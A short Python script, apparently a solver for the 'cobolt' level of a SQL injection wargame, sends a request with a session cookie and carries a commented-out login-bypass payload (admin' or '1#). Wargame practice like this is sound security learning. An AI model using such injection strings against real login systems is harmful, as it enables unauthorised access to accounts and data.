import requests

url = "http://los.rubiya.kr/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"

params = {
    #"id":"admin' or '1#"
}

headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}
res = requests.get(url, headers=headers, params=params)

print res.content